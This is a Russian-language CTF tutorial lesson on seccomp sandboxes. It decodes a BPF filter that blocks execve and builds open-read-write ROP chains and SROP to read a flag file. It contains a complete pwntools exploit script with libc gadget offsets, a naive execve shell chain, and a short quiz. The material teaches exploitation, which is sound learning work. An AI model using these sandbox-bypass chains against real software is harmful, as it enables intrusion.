---
id: pwn-seccomp-srop
title: "seccomp, SROP и техника ORW"
category: pwn
parent: pwn-ret2dlresolve
difficulty: expert
order: 1
tags: [seccomp, srop, sigreturn, orw, sandbox]
prerequisites: [pwn-ret2dlresolve, pwn-rop]
useful_for:
  - "CTF Pwn категория"
  - "Обход sandbox"
  - "Vulnerability research"
estimated_minutes: 45
summary: "Разбираем sandbox на seccomp, почему system('/bin/sh') не работает, и как применять SROP и цепочки open-read-write (ORW) для чтения флага."
---

## Вопрос, с которого всё начинается

В классическом pwn-эксплойте финал почти всегда один: вызвать `system("/bin/sh")` или выполнить `execve("/bin/sh")`. Но на современных CTF-задачах и в реальных бинарях этот финал может быть запрещён. Виновник — **seccomp**: фильтр системных вызовов в ядре Linux. Разберём, как он выглядит, почему ломает привычный эксплойт и что делать вместо него.

## Наш пример: бинарь chall

Нам дали бинарь `chall` с переполнением стека и утечкой libc. Но есть нюанс: в нём стоит фильтр `seccomp`. Фильтр хранится в бинаре как массив структур `sock_filter`. Найдём его и декодируем:

```
$ nm chall | grep filter
0000000000404040 d filter
```

Каждая инструкция фильтра — 8 байт: `code`, `jt`, `jf` и `k`. Читаем их прямо из бинаря и печатаем в человекочитаемом виде:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004
 0001: 0x15 0x01 0x00 0xc000003e
 0002: 0x06 0x00 0x00 0x80000000
 0003: 0x20 0x00 0x00 0x00000000
 0004: 0x15 0x00 0x01 0x0000003b
 0005: 0x06 0x00 0x00 0x80000000
 0006: 0x06 0x00 0x00 0x7fff0000
```

Такой же формат выдают инструменты вроде `seccomp-tools dump`. Читать его нужно так:

- `0x20` = `BPF_LD|BPF_W|BPF_ABS` — «загрузить 4 байта по смещению `k`». Смещение `4` — это поле `arch` структуры `seccomp_data` (номер syscall лежит по смещению `0`).
- `0x15` = `BPF_JMP|BPF_JEQ|BPF_K` — «если аккумулятор равен `k`, прыгнуть на `jt`, иначе на `jf`».
- `0x06` = `BPF_RET|BPF_K` — «вернуть `k`» (вердикт фильтра).

Теперь по строкам: `0000` грузит архитектуру; `0001` сравнивает её с `0xc000003e` (`x86_64`) и при несовпадении уходит на `0002`; `0002` возвращает `0x80000000` = `SECCOMP_RET_KILL_PROCESS` (убить процесс). Иначе `0003` грузит номер syscall; `0004` сравнивает его с `0x3b` (59 = `execve`) и при совпадении уходит на `0005`; `0005` снова `KILL`, а `0006` возвращает `0x7fff0000` = `SECCOMP_RET_ALLOW`.

Итог одной фразой: **разрешено всё, кроме `execve`**.

В исходниках такой фильтр записывают макросами: `BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 4)` — это и есть `0x20 0x00 0x00 0x00000004`, а `BPF_JUMP(BPF_JMP|BPF_JEQ|BPF_K, 59, 0, 1)` — строка `0004`. Скомпилированный массив лежит в секции `.data` бинаря, поэтому его можно прочитать и без запуска программы — важно лишь правильно интерпретировать байты. Вердикт `SECCOMP_RET_ERRNO` (вместо `KILL`) не убивает процесс, а заставляет syscall вернуть ошибку — это тоже стоит замечать при разборе дампа.

## Пробуем в лоб

Наивный эксплойт: переполнить буфер и выполнить `execve("/bin/sh")`. Собираем ROP-цепочку из гаджетов libc и вызываем syscall 59:

```python
binsh = next(libc.search(b'/bin/sh'))
chain = flat(pop_rdi, binsh, pop_rsi, 0, pop_rax, 0, mov_rdx_rax,
             pop_rax, 59, syscall_ret)     # execve("/bin/sh", 0, 0)
```

Запускаем:

```
$ python3 shell.py
[*] Process stopped with exit code -31 (SIGSYS)
```

Код `-31` — это сигнал **SIGSYS**: «убит seccomp-фильтром». Ядро не дало выполнить `execve`, и вместо оболочки процесс умер. Финал нужно менять.

## Приём: ORW (open–read–write)

Раз запускать программу запрещено, не будем этого делать — просто прочитаем файл и выведем его. Понадобятся три разрешённых системных вызова:

- `open` (номер 2) — открыть файл;
- `read` (номер 0) — прочитать его содержимое;
- `write` (номер 1) — вывести прочитанное.

Техника называется **ORW** (open–read–write). Каждый syscall получает аргументы в регистрах: `rdi`, `rsi`, `rdx`, а номер вызова — в `rax`. Значит, нужно уметь выставлять эти регистры гаджетами. Найдём их в libc:

```
$ ROPgadget --binary /usr/lib/libc.so.6 | grep -E ": pop (rax|rdi|rsi) ; ret"
0x00000000000d47d7 : pop rax ; ret
0x000000000010269a : pop rdi ; ret
0x0000000000053887 : pop rsi ; ret
0x000000000093916 : syscall ; ret
```

Чистого `pop rdx; ret` в свежих libc обычно нет, поэтому `rdx` выставим через `pop rax` плюс `mov rdx, rax; ret` (смещение `0x127d87`). А гаджет `syscall; ret` делает вызов и возвращается к следующему элементу цепочки — поэтому цепочка не обрывается после первого syscall.

## Полный прогон

Пишем эксплойт: `open(flagpath, 0, 0)` → `read(3, outbuf, 0x100)` → `write(1, outbuf, 0x100)`.

```python
from pwn import *
elf  = ELF('./chall'); libc = ELF('/usr/lib/libc.so.6')
p = process('./chall')
leak = u64(p.recvn(8)); libc.address = leak - libc.sym['write']

pop_rax     = libc.address + 0xd47d7
pop_rdi     = libc.address + 0x10269a
pop_rsi     = libc.address + 0x53887
mov_rdx_rax = libc.address + 0x127d87
syscall_ret = libc.address + 0x93916

def rdx(v):                          # rdx = v  (через rax)
    return flat(pop_rax, v, mov_rdx_rax)

FLAG, OUTBUF = elf.sym['flagpath'], elf.sym['outbuf']
chain  = flat(pop_rdi, FLAG, pop_rsi, 0, rdx(0), pop_rax, 2, syscall_ret)      # open
chain += flat(pop_rdi, 3, pop_rsi, OUTBUF, rdx(0x100), pop_rax, 0, syscall_ret)  # read
chain += flat(pop_rdi, 1, pop_rsi, OUTBUF, rdx(0x100), pop_rax, 1, syscall_ret)  # write

p.recvuntil(b'> ')
p.send(flat({0x108: chain}).ljust(0x300, b'\x00'))
print(p.recvall(timeout=3).split(b'\x00')[0])
```

Запускаем:

```
$ python3 exploit.py
[*] libc base @ 0x7f1ab224f000
FLAG: FLAG{s3cc0mp_0rw_0p3n_r3ad_wr1t3}
```

Флаг прочитан тремя разрешёнными syscall — без единого `execve`. `open` вернул дескриптор `3`, `read` положил файл в `outbuf`, `write` вывел его в stdout.

## Если гаджетов мало: SROP

Бывает, что гаджетов на ORW не хватает (нет `pop rdx`, `mov rdx, rax` и т.п.). Тогда выручает SROP (см. `pwn-sigreturn-exploit`): один системный вызов `rt_sigreturn` (номер 15) восстанавливает **все** регистры из подделанного фрейма на стеке. Собираешь фрейм под `open`, затем под `read` и `write`, чередуя их с `syscall; ret` — и ORW выполняется без россыпи `pop`-гаджетов. Условия: контроль стека, гаджет `syscall; ret` и разрешённый фильтром `rt_sigreturn`.

## Если не сработало

- **Фильтр разрешает `openat`, а не `open`.** Используй номер 257 и передай `dirfd = -100` (`AT_FDCWD`).
- **Файл уже открыт.** Тогда `read(3, buf, n)` без `open` — флаг часто лежит на дескрипторе 3.
- **Нужен вывод в сокет.** Вместо `write` подойдёт `sendfile(out_fd, in_fd, …)`.
- **Заблокирован `rt_sigreturn`.** SROP недоступен — остаётся чистая ROP-цепочка ORW.
- **Совсем мало разрешённых вызовов.** Задача решается только через другой баг (например, логический).

## Что мы теперь знаем

- `seccomp` — это BPF-фильтр, ограничивающий набор системных вызовов.
- Типовой CTF-фильтр запрещает `execve`, оставляя `open`/`read`/`write`.
- `system("/bin/sh")` и `execve`-шеллкод в такой задаче бесполезны — процесс убивает SIGSYS.
- Обход — ORW: прочитать файл и вывести его.
- Гаджеты `pop rax/rdi/rsi`, `mov rdx, rax`, `syscall; ret` собирают цепочку syscall-ов.
- При нехватке гаджетов тот же ORW делается через SROP.

## На что смотреть дальше

- **Что именно разрешено.** Начни с дампа фильтра, а не с гадания.
- **Номер syscall.** `open` или `openat` — зависит от фильтра.
- **Дескриптор файла.** `open` возвращает fd в `rax`.
- **`syscall; ret`.** Без него цепочка syscall-ов не соберётся.
- **`rt_sigreturn`.** Разрешён ли он — от этого зависит доступность SROP.

## Квиз

Проверь себя.

```quiz
- question: "Что делает seccomp-фильтр?"
  options:
    - "Ограничивает набор разрешённых системных вызовов"
    - "Шифрует память"
    - "Отключает ASLR"
    - "Включает canary"
  answer: 0
  explanation: "Это BPF-программа, которая решает судьбу каждого syscall."
- question: "Почему в нашей задаче не работает execve(/bin/sh)?"
  options:
    - "Фильтр убивает процесс при вызове execve (SIGSYS)"
    - "Нет гаджета syscall"
    - "Отключён ASLR"
    - "Нет строки /bin/sh"
  answer: 0
  explanation: "0004-0005 фильтра запрещают именно execve."
- question: "Что такое ORW?"
  options:
    - "Цепочка open-read-write для чтения файла без shell"
    - "Тип ROP-гаджета"
    - "Метод утечки libc"
    - "Защита ядра"
  answer: 0
  explanation: "Три разрешённых syscall читают и выводят файл."
- question: "Чем полезен гаджет syscall; ret в ORW-цепочке?"
  options:
    - "Он выполняет syscall и возвращается к следующему элементу цепочки"
    - "Он отключает seccomp"
    - "Он выравнивает стек"
    - "Он ищет libc"
  answer: 0
  explanation: "Поэтому цепочка syscall-ов не обрывается после первого вызова."
- question: "Что использовать, если pop rdx в libc нет?"
  options:
    - "SROP: восстановить все регистры из фрейма"
    - "Отключить seccomp"
    - "Вернуться к execve"
    - "Использовать /bin/sh напрямую"
  answer: 0
  explanation: "Один rt_sigreturn задаёт все регистры сразу."
```

## Куда дальше

В `pwn-sigreturn-exploit` мы разберём SROP подробно — именно он выручает, когда ORW-гаджетов не хватает. А пока главное: **если `execve` закрыт seccomp, не запускай программу — прочитай флаг через ORW.**

## Где пригодится

- **CTF:** задачи с sandbox (seccomp) — обязательный ORW/SROP.
- **Real-world:** обход песочниц (браузеры, контейнеры) использует те же идеи.
- **Bug bounty:** эксплуатация при урезанном наборе доступных syscall.
- **Работа:** понимание seccomp как защитной меры и её ограничений.
